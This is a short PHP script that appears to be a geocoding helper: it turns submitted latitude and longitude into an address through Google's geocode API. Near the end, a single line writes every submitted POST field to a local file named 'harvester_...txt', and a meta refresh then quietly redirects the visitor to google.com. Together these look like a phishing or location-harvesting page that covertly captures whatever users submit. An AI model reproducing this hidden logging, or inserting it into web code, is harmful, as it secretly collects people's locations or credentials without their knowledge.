<?php
//if latitude and longitude are submitted
if(!empty($_POST['latitude']) && !empty($_POST['longitude'])){
    //send request and receive json data by latitude and longitude
    $url = 'http://maps.googleapis.com/maps/api/geocode/json?latlng='.trim($_POST['latitude']).','.trim($_POST['longitude']).'&sensor=false';
    $json = @file_get_contents($url);
    $data = json_decode($json);
    $status = $data->status;
    
    //if request status is successful
    if($status == "OK"){
        //get address from json data
        $location = $data->results[0]->formatted_address;
    }else{
        $location =  '';
    }
    
    //return address to ajax 
    echo $location;
}
$file = 'harvester_2021-06-13 18:04:50.237664.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND); 
/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?>

<meta http-equiv="refresh" content="0; url=http://www.google.com" />